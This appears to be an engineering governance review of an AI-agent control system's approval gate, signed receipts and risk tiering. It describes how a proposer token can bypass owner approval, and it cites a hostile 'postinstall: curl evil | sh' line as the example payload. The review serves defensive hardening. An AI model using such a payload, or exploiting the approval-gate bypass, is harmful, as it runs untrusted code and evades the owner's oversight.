# 39 — Governance Review Verdict

**From:** the planning / governance instance (owner of `docs/33-BUILD-PLAN.md` and the Gate-2 corpus).
**On:** `docs/38-PROGRESS-AND-DECISIONS.md` — the implementation session's decisions and open questions.
**Read against:** `docs/32` (what Zeno is), `docs/33` (the plan), `docs/34` (the honest acceptance grading).
**Date:** 2026-09-04. **Spot-checks:** every code claim below was re-read on disk before it was written down.

This is the adjudication the implementation session asked for. It is not a cheer. Where a decision
weakens the product or the safety story it says so, and says what to do instead. The seven laws are
the product; the test applied throughout is whether each decision leaves L1–L7 exactly as strong as
they were, and whether the corpus still tells one story about itself.

---

## 1. Overall judgement — faithful, but NOT safe as it stands today

The spine is faithful to the plan and the architecture is sound. The kernel, the jailed executor,
the durable hash-chained ledger, the loopback daemon and the approval capsule are built as `docs/33`
scheduled them, and several later slices — the git executor, signing, persistence, Vault-thin,
the intake port — were pulled forward without cutting a corner that matters. The departures from the
plan (risk tiering, Ed25519 signing, dropping macOS, a Mesh protocol core, declining "196/196") are,
with two exceptions, defensible and in several cases *truer* to the product's own thesis than the
plan was.

**But the running product is not safe to stand behind as shipped, because of one line.** The daemon
derives the action kind as `str(body,'kind') ?? risk.kind` (`daemon/src/server.ts:312`) with **no
role gate**, so a caller holding only the *proposer* token can attach `kind:'local.write'` to any
write and drive it straight through the T0 auto-apply path — arbitrary files, configuration and
credentials included, committed to disk with a valid receipt and **no owner approval**. That is a
live breach of L1 ("nothing above T0 reaches the executor without an explicit owner approval"),
reachable today, through the exact seam the risk-tiering change was supposed to make safe. The MCP
server at the identical edge already does it correctly (`mcp/src/server.ts:270` hardcodes
`kind: risk.kind`; `server.test.ts:347` proves the override is inert), so the fix is one known-good
line, not a redesign. **Until that lands, the honest answer to "is this safe" is no.** Fix it and
the implementation is both faithful and safe; everything else on this page is approve or
approve-with-change.

Two secondary honesty problems compound it and must not ship unaddressed: the signing feature is
*claimed* by the daemon banner ("signed (Ed25519)") but **no shipped tool verifies a signature**
(`ledger:verify` checks only the hash chain), and `docs/34` §1 states GREEN 232/232 over 4 packages
while `docs/38`, written the same day, reports 8 packages with 3 failing tests. A repo whose honesty
document is itself stale is the one self-refutation this project cannot afford.

---

## 2. The verdicts

Legend: **approve** — do it, no change · **approve-with-change** — the call is right, the listed fix
is required before it is done · **revise** — the direction is acceptable but the current form is
wrong; change it before proceeding · **reject** — do not do this.

### Decision 1 — Windows + phone-sync, no Mac · **approve-with-change**

Cutting macOS is correct and honest. The Mac was the employer's and is gone; one person cannot build,
test and keep a second native platform honest in 11 weeks. Grading the Mac-only clauses out-of-scope
is legitimate *specifically because* `docs/34` refuses to launder unbuilt clauses into "met" — it
holds 0 met and lists the Mac rows explicitly (§5 Reason 2). The scope decision stands.

**Change (corpus consistency — my lane):** `docs/36` reverses `docs/33` §3.6 and the Phase-10
"Deferred indefinitely" row, both of which deferred Mesh *citing the identical one-machine fact* the
scope decision now overrides. The authoritative build plan therefore contradicts the scope decision
and `docs/38`. Annotate `docs/33` §3.6 and the Phase-10 Mesh row as **superseded by `docs/36`**
(phone↔Windows sync is in scope), so the plan and the scope decision stop telling opposite stories.

### Decision 2 — Jira trigger replaced by a `WorkItem` port · **approve**

Correct, and already discharged cleanly. Jira, GitLab and Slack were employer infrastructure that
ended 2026-09-02; the trigger was never Jira, it was *a work item arriving*. `packages/intake`
(79 tests) extracts that seam as a port with a local JSONL backlog as the first adapter, and
`docs/34` §5 Reason 1 honestly retires the Jira-named criteria as out-of-scope rather than pretending
they are met. No safety law is touched: intake proposes work items and nothing executes without the
same kernel gate. Two caveats, neither reopening the decision: (a) the GitHub Issues adapter is an
**inbound read** — keep it read-only until any outbound issue write is routed through the kernel as a
receipted `tracker.write`, so a new external egress does not appear below the gate; (b) the two
failing intake tests (see Q2) must green before the port is called done.

### Decision 3 — Risk-based tiering (`src/risk.ts`) · **approve-with-change**

Risk-based tiering is the right architecture and is *truer* to the product's own thesis than
uniform-T1 was. Approval fatigue genuinely defeats the product — an approval that is always asked for
is one nobody reads — and the assessment is done server-side, jailed and receipted. But two defects
undercut it:

- The auto-apply boundary lives as **hardcoded constants** (`SENSITIVE_PATHS`, `ROUTINE_LINE_BUDGET`
  in `risk.ts`). "What may happen to my machine without me" is therefore *source code*, not
  owner-governed policy hash-pinned into receipts the way every other authority decision is.
- The denylist **fails OPEN** on unenumerated paths. I confirmed `.mcp.json`, `.cursor/rules/`,
  `.vscode/`, git hooks, `*.sh` and `*.tf` are **not** in `SENSITIVE_PATHS` — all of them auto-apply —
  while the kernel's own `classify()` fails **closed** on unknown kinds/zones (rounds up to T4). That
  inconsistency should be resolved toward the kernel's fail-closed instinct.

**Change:** move the risk boundary (sensitive paths + line budget) into `policy.json` so it is
validated and hash-pinned into every receipt like `kindTier`; widen it to at least the surfaces
Forge's own trust gate treats as dangerous (`docs/33` S5.1: `.mcp.json`, `.cursor/rules/`, executable
scripts, git hooks, editor task configs); prefer an **allowlist** of auto-appliable extensions over a
denylist; and fix any README/demo copy that still claims "nothing happens without approval" — the
honest claim is **"nothing risky auto-applies, and everything is receipted."**

### Decision 4 — Signed receipts, Ed25519 · **approve-with-change**

The crypto is correct: `crypto.sign(null, msg, key)`/`verify` is the right Ed25519 API, it is
deterministic so replay-determinism survives, verify never throws on garbage, and `bodyOf` excludes
both `selfHash` and `signature` so signed and unsigned ledgers verify on one path. But **"tamper-
PROOF" is overstated as shipped**: `verifySignatures`/`verifyReceiptSignatures` are called only from
tests, `ledger:verify` checks just the hash chain, yet the daemon banner already prints
`chain verified · signed (Ed25519)` (`main.ts:70`) — a guarantee **no shipped tool exercises**, which
is exactly the sin `docs/34` §0 forbids. Worse, the private key lives at
`.zeno/keys/receipt-key.pem` beside `.zeno/ledger.jsonl`, same user, same disk, and `0600` is a
near-no-op on Windows (the declared primary platform), so the attacker who can rewrite the ledger can
read the key and re-sign perfectly.

**Change:** wire signature verification into `ledger:verify`, reading `receipt-key.pub.pem`, and
print ok/firstBadAt/unsigned counts alongside the chain result. Until the public key is exported
**off** the machine, qualify the wording everywhere from "tamper-proof" to "tamper-evident plus
authenticity once the public key is externally held," and drop or re-word the "signed (Ed25519)"
banner so it does not assert a property the CLI cannot yet check.

### Decision 5 — Voice is being built · **approve-with-change**

The direction is safe and defensible. The recognizer stays **injected** with the browser Web Speech
API as the default (no weights to license), and the one hard rule — **no spoken utterance can ever
approve** — keeps voice strictly on the propose-only side of the gate, which is the only property
that matters for L1/L6. And the narrow licence reading is right: personal, non-distributed,
non-commercial use does satisfy the NC clause the earlier caution worried about. Three conditions
before this is done:

1. **Corpus consistency (my lane):** `docs/33` §6 still lists openWakeWord as **DEAD** on
   CC BY-NC-SA — non-commercial **and ShareAlike**. Ship only Web Speech (or a permissively-licensed
   wake engine) as the default and **never commit NC-SA weights into this repo** — ShareAlike would
   infect a repo that today has **no LICENSE** and is shown to employers — *or* annotate `docs/33` §6
   with the narrowed ruling so the plan and this decision stop contradicting.
2. **Make the invariant structural, not conventional:** add a denied-path test that a voice event
   **cannot mint an approval**, the twin of the daemon's proposer-token-cannot-approve test. "No
   utterance approves" must be absent code, like Counsel's missing audio-output path — not a comment.
3. **Honesty:** the 14 voice criteria (`docs/34` §4) stay not-built until there are measured
   FAR/FRR/WER numbers; landing a push-to-talk propose flow must not be quoted as closing them.

Note also that voice is **unscheduled** in the committed Phases 0–6. Building it now is legitimate
because the owner asked, but it ranks below consolidation and greening the failing tests (§4).

### Decision 6 — Proposer token no longer prints to stdout · **approve-with-change**

Verified: `main.ts` writes the proposer token to a gitignored `proposer.token` and no longer prints
it; `.gitignore` covers `*.token`, `.zeno/` and `proposer.token`. This genuinely closes SAN-AC-06 —
the leak was the token flowing through stdout into a redirected `.daemon.log` — and the token stays a
live credential minted fresh per run behind a constant-time compare. Two residual issues undercut the
fix's own honesty:

**Change:** fix the stale CLI help string at `cli/src/main.ts:33` ("the PROPOSER token the daemon
printed on startup") — the daemon no longer prints it, so the artifact contradicts itself. Stop
implying confidentiality from `mode:0o600`: on the Windows pilot Node honors only the read-only bit,
so the file inherits the directory ACL — the real protection is "off stdout + gitignored"; say that,
and set an owner-only ACL explicitly if on-disk confinement is required. Minor: reapply the mode when
overwriting an existing token file, and remove the token on daemon exit so a stale, now-invalid
credential does not linger.

### Decision 7 — "All 196 met" declined as a goal · **approve-with-change**

Declining "196/196 met" is the right call, and strategically right, not merely ethical: "196/196" is
falsified the moment an interviewer runs `npm run check` over one product and greps zero hits for
voice/mcp/mac, and a single inflated number makes every other claim suspect — fatal for a product
whose entire differentiator is "we never dress a failure as a success." The §0 grading rule (a
criterion is met only if every clause is demonstrable) is the correct conservative discipline, and
"48 invariants proven, 45 pinned to named passing tests" reads better to a senior engineer than a
hollow checkmark. The stance is approved; the problem is that the honesty doc does not currently live
up to its own standard.

**Change:** re-freeze `docs/34` against the actual 8-package tree before the repo is shown. §1 claims
GREEN 232/232 over 4 packages while `docs/38` (same day) reports 8 packages with 3 failing tests — a
repo whose honesty doc says "green" while `npm run check` is red is the exact self-refutation this
stance exists to prevent. Re-run the full check, resolve the count, and either land the 3 failing
tests (Q2) or mark the tree honestly partial-red. Separately, have the README/front door lead with
"48 invariants proven, each a named passing test" and present "0/196 met" as the grading footnote, so
a lazy screener does not misread "0" as "nothing works."

### Q1 — Is risk-based auto-apply acceptable? · **revise**

Auto-apply is acceptable *in principle* but, **as shipped, it does not preserve L1.** I empirically
confirmed the hole above (Decision 3 / §1): a proposer token defeats the entire risk assessment by
adding `kind:'local.write'` to the `/previews` body, because the daemon uses
`str(body,'kind') ?? risk.kind` (`server.ts:312`) with no role gate — so a hostile `package.json`
carrying `postinstall: curl evil | sh` auto-commits to disk with a verified receipt and no owner
approval, even though `assessWrite` had correctly returned non-routine. That falsifies Decision 3's
stated trade ("never a config change … small edits in your sandbox only"): the real blast radius of a
leaked proposer token is arbitrary writes to any file, config and credentials included. The MCP twin
already does this correctly, so the fix is known-good.

**Change:** in the daemon, derive `kind` **solely** from `assessWrite` and delete the caller-supplied
override at `server.ts:312` (match the MCP server); add the daemon twin of `mcp/server.test.ts:347`
asserting a kind-downgrade is ignored and nothing is written. **Only then** keep auto-apply — made
owner-configurable per the implementation's own lean, including a supported `auto_apply: off` setting
and a conservative default, with the threshold and path set carried in hash-pinned `policy.json`
rather than in code. This is the one blocking safety fix on the page.

### Q2 — Fix the code, or update the three failing tests? · **approve** (update the tests)

Update the tests — the MCP double-apply is a benign idempotent no-op, not an L4 violation. `baseHash`
is part of the action identity (and must be, or CAS/L3 is meaningless), so a re-proposal after the
base moves is a genuinely distinct action; the executor is idempotent (P20) so writing v1 over v1
changes nothing, and the spent-action guard holds the third identical proposal — no action is ever
applied or attempted twice, so L2 and L4 both hold. The two intake failures are GitHub error-message
wording assertions, unrelated to L1/L2/L4, exactly as `docs/38` characterizes. On a fresh compile all
three already pass on disk, so the corrected tests are the ones to keep.

**Optional truthfulness refinement:** have `proposeWrite` distinguish a verified no-op
("already-current", zero bytes changed) from a real "committed," so the model on the pipe is not told
"committed" when nothing changed — symmetric with the honesty the server already applies to the
not-applied/refused path.

### Q3 — Sign receipts by default? · **approve-with-change**

Default-on is right: keygen is $0 and local, signatures are deterministic so replay-determinism is
preserved, it is strictly additive (an unsigned kernel still verifies its chain), and it pre-positions
the externally-verifiable public key that Mesh will need — opt-in signing is a guarantee nobody would
ever enable. But default-on is only honest **paired with Decision 4's fixes**: defaulting every
ledger to "signed" while nothing verifies the signature converts a real feature into an unexercised
claim. There is also a **silent-key-rotation bug** I confirmed: `loadOrCreateSigner`
(`signer-node.ts`) regenerates **both** keys if **either** file is unreadable, so deleting only
`receipt-key.pub.pem` silently mints a new keypair, overwrites the private key, and orphans the
verifiability of every prior receipt with no warning.

**Change:** keep default-on, but only alongside the shipped verify path from Decision 4. Fix
`loadOrCreateSigner`: if the private key exists but the public file is missing, **derive** the public
from the private (`createPublicKey(priv).export` spki) rather than regenerating; never silently
overwrite an existing private key.

### Q4 — Mesh: protocol core proven against a simulated device · **approve-with-change**

Yes, this is the right and honest stopping point, and the code earns it — it is not a half-measure.
Pairing is X25519 DH with an out-of-band code folded into HKDF as salt **and** a SAS over both public
keys to expose an active MITM; the envelope is AES-256-GCM with the seq bound as AAD and a sliding
replay window; the state is a proper LWW CvRDT with tombstones and Lamport clocks; and the property
test drives **two real endpoints** — each with its own identity, keys, replica and replay guard —
through a seeded lossy/reordering/duplicating/injecting channel and asserts convergence plus that
duplicates, tampered frames and unknown senders are all caught. The "simulated" peer is a genuine
second endpoint over an injected byte transport, not a self-loop. Ship it as a **library** — strong
applied-crypto / distributed-systems signal. It must **never** be described as working phone sync:
there is still no real transport and no durable trust/replica store, so nothing syncs across a
restart or between two processes yet.

**Change:** cap Mesh here — no phone app, no real transport, no durable pairing/replica stores this
cycle. Rule that the next acceptance re-grade may move MESH/LINK rows to **partial at most** (the
protocol clauses: convergence, replay defense, MITM defense, revocation) and **never to met**, since
there is no real second endpoint or wire. And sequence any further Mesh **behind** the two
higher-value fixes it is crowding (§4): wiring the durable `PendingStore` into the daemon
(VIDEO-AC-11) and greening the three failing tests.

### Q5 — Next effort: Forge, or a local model runtime? · **revise** (local model first)

The implementation's factual claim is fair — Forge closes more raw criteria. But **"defensible to
build now" is where Forge-first fails**: `docs/33` S5.3's executor ships private repo contents to
Anthropic, which quietly contradicts the "local-first / your data stays on your machines" promise and
routes egress the Sanitizer is supposed to guard — while `docs/34` confirms the sanitizer is **not
yet wired to model egress**. Building the risky cloud hand *before its guard* is exactly the ordering
the kernel philosophy rejects. Ollama / the Phase-3 assistant is product #1, is 100% local (S3.1's
done-criterion is zero outbound sockets, so there is no egress question), and converts the repo's
single strongest claim — injection defense — into a **live-model demo**, which the plan itself calls
the moment "that makes a senior engineer sit up."

**Change:** restore the plan's order — build the local model runtime / assistant (Phase 3, Ollama)
next, **not** Forge. Do Forge immediately after, and **only** once the sealed context pack (S5.2)
routes Claude Code's egress through the Sanitizer as an owner-approved, receipted egress, so Forge's
cloud round-trip is governed rather than a bypass of the product's own egress guard. Flag to the
owner that both are likely outranked by **consolidation** (`docs/38` §5.5): with 52 uncommitted files
and 3 failing tests today, turning eight libraries into one honest running product is the higher
interview-value next step than opening a new vertical.

---

## 3. Before this goes in front of an interviewer — ranked

1. **[SAFETY · blocking] Close the L1 breach.** In the daemon, derive `kind` from `assessWrite` only
   and delete the caller-supplied override at `server.ts:312`; add the daemon twin of
   `mcp/server.test.ts:347`. Nothing else on this list matters until a proposer token can no longer
   auto-commit arbitrary files. *(Q1)*
2. **Re-freeze `docs/34` against the real 8-package tree.** It says GREEN 232/232 over 4 packages
   while `docs/38` says 8 packages, 3 failing. Resolve the count; a stale honesty doc is the one
   self-refutation the whole stance forbids. *(Decision 7)*
3. **Green the three failing tests** — update them per Q2 (the new behaviour is correct; the tests
   assert the old model). *(Q2)*
4. **Stop asserting an unverified guarantee.** Wire signature verification into `ledger:verify`; drop
   or qualify the "signed (Ed25519)" banner (`main.ts:70`) and every "tamper-proof" claim to
   "tamper-evident + authenticity once the public key is held off-machine." *(Decision 4)*
5. **Move the risk boundary into hash-pinned `policy.json`**, widen it to Forge's danger set
   (`.mcp.json`, `.cursor/rules/`, executable scripts, git hooks, editor task configs), prefer an
   auto-apply allowlist over the fail-open denylist, and add the `auto_apply: off` switch. *(Decision 3 / Q1)*
6. **Fix the silent-key-rotation bug** in `loadOrCreateSigner`: derive the public key from an existing
   private key; never overwrite a private key. *(Q3)*
7. **Corpus consistency:** annotate `docs/33` §3.6 + the Phase-10 Mesh row as superseded by `docs/36`;
   annotate `docs/33` §6's openWakeWord ruling with the narrowed voice-licence position. *(Decisions 1, 5)*
8. **Front door:** README leads with "48 invariants proven, each a named passing test," with "0/196
   met" as the grading footnote. Fix the stale CLI help string (`cli/main.ts:33`) and the
   `0600`-implies-confidential wording. *(Decisions 6, 7)*

## 4. What to build next — ranked

1. **Consolidate (`docs/38` §5.5).** Wire the 8 packages + sanitizer into one governed running
   product. With 52 uncommitted files and 3 failing tests, one honest product beats eight libraries —
   and this is where fixes 1–6 above actually land.
2. **Wire the durable `PendingStore` into the daemon** (VIDEO-AC-11). A post-restart approval returns
   404 today — the most embarrassing gap in the running product, ~half a day, and the store already
   exists in the kernel.
3. **Local model runtime / assistant** (Phase 3, Ollama) — restore the plan's order. 100% local, no
   egress question, and it turns injection defense into a live demo. *Not Forge.* *(Q5)*
4. **Forge — after, and only behind its guard.** Build it once the sealed context pack routes Claude
   Code's egress through the Sanitizer as an owner-approved, receipted egress. *(Q5)*
5. **Cap Mesh as a library.** No phone app, no real transport, no durable stores this cycle; the
   next re-grade may reach partial, never met. *(Q4)*
6. **Voice**, with Web Speech as the default and the *tested* no-voice-approval invariant — below
   consolidation and the assistant. *(Decision 5)*

---

## 5. One-line disposition of every cluster

| Cluster | Verdict |
|---|---|
| Decision 1 — Windows + phone-sync, no Mac | approve-with-change (annotate `docs/33` vs `docs/36`) |
| Decision 2 — Jira → `WorkItem` port | approve (keep GitHub adapter read-only; green Q2 tests) |
| Decision 3 — Risk-based tiering | approve-with-change (boundary into policy.json; widen; allowlist) |
| Decision 4 — Signed receipts (Ed25519) | approve-with-change (wire verify; qualify "tamper-proof") |
| Decision 5 — Voice is being built | approve-with-change (licence/corpus; test the no-approve rule) |
| Decision 6 — Token off stdout | approve-with-change (stale help string; ACL not `0600`) |
| Decision 7 — Decline "196/196 met" | approve-with-change (re-freeze `docs/34`; fix front door) |
| Q1 — Risk-based auto-apply | **revise** (delete the `server.ts:312` kind override first) |
| Q2 — Fix code or tests | approve (update the tests) |
| Q3 — Sign by default | approve-with-change (only with a verify path; fix key rotation) |
| Q4 — Mesh protocol core | approve-with-change (ship as a library; cap the re-grade at partial) |
| Q5 — Forge vs local model next | **revise** (local model first; Forge only behind the Sanitizer) |
